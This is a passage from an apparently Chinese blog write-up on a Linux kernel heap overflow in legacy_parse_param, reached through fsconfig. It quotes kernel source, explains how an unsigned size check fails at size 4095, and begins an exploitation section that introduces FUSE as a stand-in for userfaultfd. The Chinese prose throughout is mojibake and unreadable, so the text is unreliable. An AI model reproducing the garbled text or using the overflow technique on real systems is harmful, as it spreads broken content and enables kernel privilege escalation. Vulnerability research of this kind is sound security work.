class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ä¸Šè¿°å‡½æ•°ä¸­ä¾æ—§æ˜¯æ ¹æ®cmdè¿›å…¥ä¸åŒçš„swithåˆ†æ”¯</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">fsconfig_command</span> &#123;</span></span><br><span class="line">FSCONFIG_SET_FLAG= <span class="number">0</span>,<span class="comment">/* Set parameter, supplying no value */</span></span><br><span class="line">FSCONFIG_SET_STRING= <span class="number">1</span>,<span class="comment">/* Set parameter, supplying a string value */</span></span><br><span class="line">FSCONFIG_SET_BINARY= <span class="number">2</span>,<span class="comment">/* Set parameter, supplying a binary blob value */</span></span><br><span class="line">FSCONFIG_SET_PATH= <span class="number">3</span>,<span class="comment">/* Set parameter, supplying an object by path */</span></span><br><span class="line">FSCONFIG_SET_PATH_EMPTY= <span class="number">4</span>,<span class="comment">/* Set parameter, supplying an object by (empty) path */</span></span><br><span class="line">FSCONFIG_SET_FD= <span class="number">5</span>,<span class="comment">/* Set parameter, supplying an object by fd */</span></span><br><span class="line">FSCONFIG_CMD_CREATE= <span class="number">6</span>,<span class="comment">/* Invoke superblock creation */</span></span><br><span class="line">FSCONFIG_CMD_RECONFIGURE = <span class="number">7</span>,<span class="comment">/* Invoke superblock reconfiguration */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>æ ¹æ®å®šä¹‰ï¼Œæœ€ç»ˆä¼šè¿›å…¥åˆ°<code>default</code>åˆ†æ”¯ä¸­ï¼Œæœ€ç»ˆä¼šè°ƒç”¨<code>vfs_parse_fs_param</code>å‡½æ•°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vfs_parse_fs_param</span><span class="params">(struct fs_context *fc, struct fs_parameter *param)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!param-&gt;key)</span><br><span class="line"><span class="keyword">return</span> invalf(fc, <span class="string">&quot;Unnamed parameter\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">ret = vfs_parse_sb_flag(fc, param-&gt;key);</span><br><span class="line"><span class="keyword">if</span> (ret != -ENOPARAM)</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line">ret = security_fs_context_parse_param(fc, param);</span><br><span class="line"><span class="keyword">if</span> (ret != -ENOPARAM)</span><br><span class="line"><span class="comment">/* Param belongs to the LSM or is disallowed by the LSM; so</span></span><br><span class="line"><span class="comment"> * don&#x27;t pass to the FS.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (fc-&gt;ops-&gt;parse_param) &#123;</span><br><span class="line">ret = fc-&gt;ops-&gt;parse_param(fc, param);</span><br><span class="line"><span class="keyword">if</span> (ret != -ENOPARAM)</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* If the filesystem doesn&#x27;t take any arguments, give it the</span></span><br><span class="line"><span class="comment"> * default handling of source.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">strcmp</span>(param-&gt;key, <span class="string">&quot;source&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (param-&gt;type != fs_value_is_string)</span><br><span class="line"><span class="keyword">return</span> invalf(fc, <span class="string">&quot;VFS: Non-string source&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (fc-&gt;source)</span><br><span class="line"><span class="keyword">return</span> invalf(fc, <span class="string">&quot;VFS: Multiple sources&quot;</span>);</span><br><span class="line">fc-&gt;source = param-&gt;<span class="built_in">string</span>;</span><br><span class="line">param-&gt;<span class="built_in">string</span> = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> invalf(fc, <span class="string">&quot;%s: Unknown parameter &#x27;%s&#x27;&quot;</span>,</span><br><span class="line">      fc-&gt;fs_type-&gt;name, param-&gt;key);</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(vfs_parse_fs_param);</span><br></pre></td></tr></table></figure><p>è€Œåœ¨æ­¤å‡½æ•°ä¸­ä¼šè°ƒç”¨åˆ°<code>fs_context-&gt;ops-&gt;parse_param</code>ï¼Œæ¥ç€æ ¹æ®å‰é¢åœ¨<code>legacy_init_fs_context</code>å‡½æ•°ä¸­ä¼šå¯¹<code>fs_context-&gt;ops</code>èµ‹å€¼ä¸º<code>legacy_fs_context_ops</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">fs_context_operations</span> <span class="title">legacy_fs_context_ops</span> =</span> &#123;</span><br><span class="line">.<span class="built_in">free</span>= legacy_fs_context_free,</span><br><span class="line">.dup= legacy_fs_context_dup,</span><br><span class="line">.parse_param= legacy_parse_param,</span><br><span class="line">.parse_monolithic= legacy_parse_monolithic,</span><br><span class="line">.get_tree= legacy_get_tree,</span><br><span class="line">.reconfigure= legacy_reconfigure,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>æ ¹æ®å‰é¢æ‰€è¿°ï¼Œæœ€ç»ˆä¼šè°ƒç”¨åˆ°<code>legacy_parse_param</code>å‡½æ•°ä¸­ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">legacy_parse_param</span><span class="params">(struct fs_context *fc, struct fs_parameter *param)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">legacy_fs_context</span> *<span class="title">ctx</span> =</span> fc-&gt;fs_private;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> size = ctx-&gt;data_size;</span><br><span class="line"><span class="keyword">size_t</span> len = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">strcmp</span>(param-&gt;key, <span class="string">&quot;source&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (param-&gt;type != fs_value_is_string)</span><br><span class="line"><span class="keyword">return</span> invalf(fc, <span class="string">&quot;VFS: Legacy: Non-string source&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (fc-&gt;source)</span><br><span class="line"><span class="keyword">return</span> invalf(fc, <span class="string">&quot;VFS: Legacy: Multiple sources&quot;</span>);</span><br><span class="line">fc-&gt;source = param-&gt;<span class="built_in">string</span>;</span><br><span class="line">param-&gt;<span class="built_in">string</span> = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ctx-&gt;param_type == LEGACY_FS_MONOLITHIC_PARAMS)</span><br><span class="line"><span class="keyword">return</span> invalf(fc, <span class="string">&quot;VFS: Legacy: Can&#x27;t mix monolithic and individual options&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (param-&gt;type) &#123;</span><br><span class="line"><span class="keyword">case</span> fs_value_is_string:</span><br><span class="line">len = <span class="number">1</span> + param-&gt;size;</span><br><span class="line"><span class="comment">/* Fall through */</span></span><br><span class="line"><span class="keyword">case</span> fs_value_is_flag:</span><br><span class="line">len += <span class="built_in">strlen</span>(param-&gt;key);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">return</span> invalf(fc, <span class="string">&quot;VFS: Legacy: Parameter type for &#x27;%s&#x27; not supported&quot;</span>,</span><br><span class="line">      param-&gt;key);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (len &gt; PAGE_SIZE - <span class="number">2</span> - size)</span><br><span class="line"><span class="keyword">return</span> invalf(fc, <span class="string">&quot;VFS: Legacy: Cumulative options too large&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">strchr</span>(param-&gt;key, <span class="string">&#x27;,&#x27;</span>) ||</span><br><span class="line">    (param-&gt;type == fs_value_is_string &amp;&amp;</span><br><span class="line">     <span class="built_in">memchr</span>(param-&gt;<span class="built_in">string</span>, <span class="string">&#x27;,&#x27;</span>, param-&gt;size)))</span><br><span class="line"><span class="keyword">return</span> invalf(fc, <span class="string">&quot;VFS: Legacy: Option &#x27;%s&#x27; contained comma&quot;</span>,</span><br><span class="line">      param-&gt;key);</span><br><span class="line"><span class="keyword">if</span> (!ctx-&gt;legacy_data) &#123;</span><br><span class="line">ctx-&gt;legacy_data = kmalloc(PAGE_SIZE, GFP_KERNEL);</span><br><span class="line"><span class="keyword">if</span> (!ctx-&gt;legacy_data)</span><br><span class="line"><span class="keyword">return</span> -ENOMEM;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ctx-&gt;legacy_data[size++] = <span class="string">&#x27;,&#x27;</span>;</span><br><span class="line">len = <span class="built_in">strlen</span>(param-&gt;key);</span><br><span class="line"><span class="built_in">memcpy</span>(ctx-&gt;legacy_data + size, param-&gt;key, len);</span><br><span class="line">size += len;</span><br><span class="line"><span class="keyword">if</span> (param-&gt;type == fs_value_is_string) &#123;</span><br><span class="line">ctx-&gt;legacy_data[size++] = <span class="string">&#x27;=&#x27;</span>;</span><br><span class="line"><span class="built_in">memcpy</span>(ctx-&gt;legacy_data + size, param-&gt;<span class="built_in">string</span>, param-&gt;size);</span><br><span class="line">size += param-&gt;size;</span><br><span class="line">&#125;</span><br><span class="line">ctx-&gt;legacy_data[size] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">ctx-&gt;data_size = size;</span><br><span class="line">ctx-&gt;param_type = LEGACY_FS_INDIVIDUAL_PARAMS;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆåœ¨<code>ctx-&gt;data_size</code>ä¸­å–å‡ºå·²æ‹·è´çš„å¤§å°ï¼Œéšåæ ¹æ®<code>param-&gt;type</code>è®¡ç®—å‡ºlenï¼Œè‹¥æ˜¯ä¸å­˜åœ¨<code>ctx-&gt;legacy_data</code>åˆ™ä¼šç”³è¯·ä¸€å¼ é¡µé¢å¤§å°ï¼Œåç»­åˆ™æ˜¯ä»<code>param</code>ä¸­å–å‡ºæ•°æ®å†™åˆ°<code>ctx-legacy_data</code>ä¸­å»ã€‚</p><p>å¯ä»¥çœ‹åˆ°åœ¨è®¡ç®—å‡ºlenä¹‹åå…¶å®æ˜¯ç»è¿‡äº†ä¸€æ¬¡åˆ¤æ–­çš„ï¼Œ<code>len &gt; PAGE_SIZE - 2 - size</code>è¿™é‡Œå°±æ˜¯å…¶è¡¨è¾¾å¼ï¼Œä¸è¿‡å­˜åœ¨é—®é¢˜çš„æ˜¯åœ¨å‡½æ•°å¼€å¤´å®šä¹‰<code>size</code>ä½¿ç”¨çš„æ˜¯<code>unsigned int</code>ï¼Œæ‰€ä»¥è¿™ä¸ªåˆ¤æ–­å°±æˆäº†æ— ç¬¦å·ç±»å‹çš„åˆ¤æ–­äº†ï¼Œä¸€æ—¦<code>size + 2</code>å¤§äº<code>PAGE_SIZE</code>é‚£ä¹ˆè¿™ä¸ªåˆ¤æ–­æ˜¯ä¼šä¸€ç›´æˆç«‹çš„ï¼Œä»è€Œè¾¾åˆ°äº†æº¢å‡ºçš„æ•ˆæœã€‚</p><p>ä¸è¿‡è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯åœ¨å‰é¢çš„<code>fsconfig</code>ç³»ç»Ÿè°ƒç”¨å®ç°çš„å‡½æ•°ä¸­åœ¨å¯¹<code>param</code>è¿›è¡Œåˆå§‹åŒ–æ—¶ä½¿ç”¨çš„æ˜¯è¿™æ ·ä¸€æ¡è¯­å¥</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">param.<span class="built_in">string</span> = strndup_user(_value, <span class="number">256</span>);</span><br></pre></td></tr></table></figure><p>è¿™é‡Œä¹Ÿå°±é™åˆ¶äº†æˆ‘ä»¬å•æ¬¡å†™å…¥çš„å¤§å°åªèƒ½æ˜¯<code>0x100</code>ä¸ªå­—èŠ‚ï¼Œä¸è¿‡å¯ä»¥çœ‹åˆ°çš„æ˜¯åœ¨<code>legacy_parse_param</code>å‡½æ•°æœ«å°¾æ˜¯åˆå¯¹<code>ctx-&gt;data_size</code>è¿›è¡Œäº†èµ‹å€¼å¹¶ä¸”å€¼çš„å¤§å°ä¸º<code>len + size</code>å’Œ<code>size += param-&gt;size;</code>ï¼Œå¹¶ä¸”åé¢åœ¨æ‹·è´çš„æ—¶å€™ä½¿ç”¨çš„æ˜¯<code>ctx-&gt;legacy_data + size</code>ã€‚æ‰€ä»¥æˆ‘ä»¬æƒ³è¦è¾¾åˆ°æº¢å‡ºçš„æ•ˆæœéœ€è¦å°†<code>size</code>æ„é€ ä¸º4095ã€‚</p><p>å‰é¢æåˆ°äº†<code>size</code>æœ€ç»ˆçš„å€¼æ˜¯é‚£ä¸¤ä¸ªçš„å’Œï¼Œä½†å…¶å®è¿˜å­˜åœ¨ä¸¤ä¸ªæ“ä½œä¼šå¯¹å…¶åšå¢åŠ æ“ä½œï¼Œä¹Ÿå°±æ˜¯åœ¨æ¯ä¸€æ¡å‰é¢éƒ½ä¼šåŠ ä¸Šä¸€ä¸ª<code>&quot;,&quot;</code>è€Œåœ¨keyåé¢éƒ½ä¼šåŠ ä¸Šä¸€ä¸ª<code>&quot;=&quot;</code>æ‰€ä»¥å…¶å®å†™å…¥çš„æœ€ç»ˆæ•ˆæœå¦‚ä¸‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">,key=val</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥æ¯ä¸€æ¬¡æ‹·è´çš„é•¿åº¦å…¶å®æ˜¯<code>strlen(key) + strlen(val) + 2</code></p><h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><p>å¯ä»¥é¢„è§çš„æ˜¯ï¼Œå½“æˆ‘ä»¬æ§åˆ¶<code>size = 4095</code>æ—¶ï¼Œä»–ä¼šåœ¨ä¸‹ä¸€ä¸ªç›¸é‚»<code>object</code>å†™å…¥<code>=</code>ä»¥åŠæœ«å°¾çš„ä¸€ä¸ª<code>\x00</code>ï¼Œæ‰€ä»¥è¿™é‡Œé‡‡å–çš„åŠæ³•æ˜¯ä¸ç›´æ¥è¦†ç›–ç›¸é‚»<code>object</code>çš„å†…å®¹ï¼Œè€Œæ˜¯ç›´æ¥è¦†ç›–æ‰åä¸€ä¸ª<code>object</code>çš„å†…å®¹ã€‚</p><h3 id="FUSE"><a href="#FUSE" class="headerlink" title="FUSE"></a>FUSE</h3><p>åœ¨ä»¥å¾€çš„æ–‡ç« ä¸­æåˆ°äº†<code>userfaultfd</code>ç³»ç»Ÿè°ƒç”¨ï¼Œå¯æƒœçš„æ˜¯åœ¨<code>Linux 5.11</code>èµ·å°±ä¸å†èƒ½ç”¨æ™®é€šç”¨æˆ·è¿›è¡Œè°ƒç”¨äº†ï¼Œç„¶è€Œå…¶å®<code>FUSE</code>ä¹Ÿæ˜¯å¯ä»¥è¾¾åˆ°é‡æ ·çš„æ•ˆæœçš„ã€‚</p><p>é¦–å…ˆç®€å•ä»‹ç»ä¸€ä¸‹<code>FUSE</code>ï¼Œå³ç”¨æˆ·ç©ºé—´æ–‡ä»¶ç³»ç»Ÿï¼Œè¯¥åŠŸèƒ½å…è®¸éç‰¹æƒç”¨æˆ·åœ¨ç”¨æˆ·ç©ºé—´å®ç°ä¸€ä¸ªç”¨æˆ·æ€æ–‡ä»¶ç³»ç»Ÿï¼Œå¼€å‘è€…åªéœ€è¦å®ç°å¯¹åº”çš„æ–‡ä»¶æ“ä½œæ¥å£å°±å¯ä»¥åœ¨ç”¨æˆ·ç©ºé—´å®ç°ä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿï¼Œè€Œä¸éœ€è¦é‡æ–°ç¼–è¯‘å†…æ ¸ï¼Œè¿™ç»™å¼€å‘è€…æä¾›äº†ç›¸å½“çš„ä¾¿åˆ©ã€‚</p><p><code>FUSE</code> è‡ª <code>Linux 2.6.14</code> ç‰ˆæœ¬å¼•å…¥ï¼Œä¸»è¦ç”±ä¸¤éƒ¨åˆ†ç»„æˆï¼š</p><ul><li>  FUSE å†…æ ¸æ¨¡å—ï¼Œè´Ÿè´£ä¸ kernel çš„ VFS è¿›è¡Œäº¤äº’ï¼Œå¹¶å‘ç”¨æˆ·ç©ºé—´å®ç°çš„æ–‡ä»¶ç³»ç»Ÿè¿›ç¨‹æš´éœ² <code>/dev/fuse</code> å—è®¾å¤‡æ¥å£</li><li>  <a class="link"   href="https://github.com/libfuse/libfuse" >ç”¨æˆ·ç©ºé—´çš„ libfuse åº“<i class="fas fa-external-link-alt"></i></a> è´Ÿè´£å‘ç”¨æˆ·ç¨‹åºæä¾›å°è£…å¥½çš„æ¥å£ï¼Œå¼€å‘è€…åŸºäºè¯¥åº“è¿›è¡Œç”¨æˆ·ç©ºé—´æ–‡ä»¶ç³»ç»Ÿçš„å¼€å‘ï¼šç”±ä¸€ä¸ª <code>FUSE daemon</code> å®ˆæŠ¤è¿›ç¨‹è´Ÿè´£ä¸å†…æ ¸æ¨¡å—è¿›è¡Œäº¤äº’å¹¶è¿›è¡Œæ–‡ä»¶ç³»ç»Ÿçš„å…·ä½“æ“ä½œ</li></ul><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/zDwY7GMZQkE2c9m.png"                                     ></p><p>FUSE çš„åŸºæœ¬è¿è¡ŒåŸç†å¦‚ä¸‹ï¼š</p><ul><li>  <code>FUSE daemon</code> å®ˆæŠ¤è¿›ç¨‹é€šè¿‡ libfuse åº“çš„ <code>fuse_main()</code> æ³¨å†Œæ–‡ä»¶ç³»ç»Ÿä¸å¯¹åº”çš„å¤„ç†å‡½æ•°ï¼Œå¹¶æŒ‚è½½åˆ°å¯¹åº”çš„ç›®å½•ä¸‹ï¼ˆä¾‹å¦‚ <code>/mnt/fuse</code>ï¼‰</li><li>  ç”¨æˆ·è¿›ç¨‹è®¿é—®æŒ‚è½½ç‚¹ä¸‹çš„æ–‡ä»¶ï¼ˆä¾‹å¦‚ <code>/mnt/fuse/file</code>ï¼‰ï¼Œæ¥åˆ°å†…æ ¸ä¸­çš„ VFS å¯¹åº” inode çš„ <code>inode_operations</code> ä¸­çš„å¤„ç†å‡½æ•°ï¼Œäº¤ç”± FUSE å†…æ ¸æ¨¡å—è¿›è¡Œå¤„ç†</li><li>  FUSE å†…æ ¸æ¨¡å—å°†è¯·æ±‚è½¬æ¢ä¸ºä¸ç”¨æˆ·æ€ daemon è¿›ç¨‹é—´çº¦å®šçš„æ ¼å¼ï¼Œäº¤ç”±ç”¨æˆ·æ€å¯¹åº”çš„ <code>FUSE daemon</code> å®ˆæŠ¤è¿›ç¨‹è¿›è¡Œå¤„ç†</li><li>  åœ¨ <code>FUSE daemon</code> è°ƒç”¨æ–‡ä»¶ç³»ç»Ÿåˆ›å»ºæ—¶æ³¨å†Œçš„å¯¹åº”çš„å¤„ç†å‡½æ•°ï¼Œè¿™ä¸€æ­¥å¯èƒ½ä¼šéœ€è¦è®¿é—®å®é™…çš„æ–‡ä»¶ç³»ç»Ÿ</li><li>  <code>FUSE daemon</code> å®Œæˆå¤„ç†ï¼Œè¿”å›ç»“æœè‡³ FUSE å†…æ ¸æ¨¡å—ï¼Œå†ç»ç”± VFS è¿”å›ç»™ç”¨æˆ·è¿›ç¨‹</li></ul><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/9q3VSGepCnKzbuB.png"                                     ></p><p>è¿™é‡Œä¸è¿‡å¤šä»‹ç»äº†ï¼Œåé¢å°±è¯´è¯´åŸºæœ¬ç”¨æ³•å°±è¡Œäº†ï¼Œä¹Ÿå’Œ<code>userfaultfd</code>ç±»ä¼¼ï¼Œæ˜¯ä¸€ä¸ªæ¨¡æ¿ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fuse_operations</span> &#123;</span></span><br><span class="line"><span class="keyword">int</span> (*getattr) (<span class="keyword">const</span> <span class="keyword">char</span> *, struct stat *, struct fuse_file_info *fi);</span><br><span class="line"><span class="keyword">int</span> (*readlink) (<span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">char</span> *, <span class="keyword">size_t</span>);</span><br><span class="line"><span class="keyword">int</span> (*mknod) (<span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">mode_t</span>, <span class="keyword">dev_t</span>);</span><br><span class="line"><span class="keyword">int</span> (*mkdir) (<span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">mode_t</span>);</span><br><span class="line"><span class="comment">/** Remove a file */</span></span><br><span class="line"><span class="keyword">int</span> (*unlink) (<span class="keyword">const</span> <span class="keyword">char</span> *);</span><br><span class="line"><span class="comment">/** Remove a directory */</span></span><br><span class="line"><span class="keyword">int</span> (*rmdir) (<span class="keyword">const</span> <span class="keyword">char</span> *);</span><br><span class="line"><span class="comment">/** Create a symbolic link */</span></span><br><span class="line"><span class="keyword">int</span> (*symlink) (<span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">const</span> <span class="keyword">char</span> *);</span><br><span class="line"><span class="keyword">int</span> (*rename) (<span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">unsigned</span> <span class="keyword">int</span> flags);</span><br><span class="line"><span class="keyword">int</span> (*link) (<span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">const</span> <span class="keyword">char</span> *);</span><br><span class="line"><span class="keyword">int</span> (*chmod) (<span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">mode_t</span>, struct fuse_file_info *fi);</span><br><span class="line"><span class="keyword">int</span> (*chown) (<span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">uid_t</span>, <span class="keyword">gid_t</span>, struct fuse_file_info *fi);</span><br><span class="line"><span class="keyword">int</span> (*truncate) (<span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">off_t</span>, struct fuse_file_info *fi);</span><br><span class="line"><span class="keyword">int</span> (*open) (<span class="keyword">const</span> <span class="keyword">char</span> *, struct fuse_file_info *);</span><br><span class="line"><span class="keyword">int</span> (*read) (<span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">char</span> *, <span class="keyword">size_t</span>, <span class="keyword">off_t</span>,</span><br><span class="line">     struct fuse_file_info *);</span><br><span class="line"><span class="keyword">int</span> (*write) (<span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">size_t</span>, <span class="keyword">off_t</span>,</span><br><span class="line">      struct fuse_file_info *);</span><br><span class="line"><span class="keyword">int</span> (*statfs) (<span class="keyword">const</span> <span class="keyword">char</span> *, struct statvfs *);</span><br><span class="line"><span class="keyword">int</span> (*flush) (<span class="keyword">const</span> <span class="keyword">char</span> *, struct fuse_file_info *);</span><br><span class="line"><span class="keyword">int</span> (*release) (<span class="keyword">const</span> <span class="keyword">char</span> *, struct fuse_file_info *);</span><br><span class="line"><span class="keyword">int</span> (*fsync) (<span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">int</span>, struct fuse_file_info *);</span><br><span class="line"><span class="keyword">int</span> (*setxattr) (<span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">size_t</span>, <span class="keyword">int</span>);</span><br><span class="line"><span class="keyword">int</span> (*getxattr) (<span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">char</span> *, <span class="keyword">size_t</span>);</span><br><span class="line"><span class="keyword">int</span> (*listxattr) (<span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">char</span> *, <span class="keyword">size_t</span>);</span><br><span class="line"><span class="keyword">int</span> (*removexattr) (<span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">const</span> <span class="keyword">char</span> *);</span><br><span class="line"><span class="keyword">int</span> (*opendir) (<span class="keyword">const</span> <span class="keyword">char</span> *, struct fuse_file_info *);</span><br><span class="line"><span class="keyword">int</span> (*readdir) (<span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">void</span> *, <span class="keyword">fuse_fill_dir_t</span>, <span class="keyword">off_t</span>,</span><br><span class="line">struct fuse_file_info *, <span class="keyword">enum</span> fuse_readdir_flags);</span><br><span class="line"><span class="keyword">int</span> (*releasedir) (<span class="keyword">const</span> <span class="keyword">char</span> *, struct fuse_file_info *);</span><br><span class="line"><span class="keyword">int</span> (*fsyncdir) (<span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">int</span>, struct 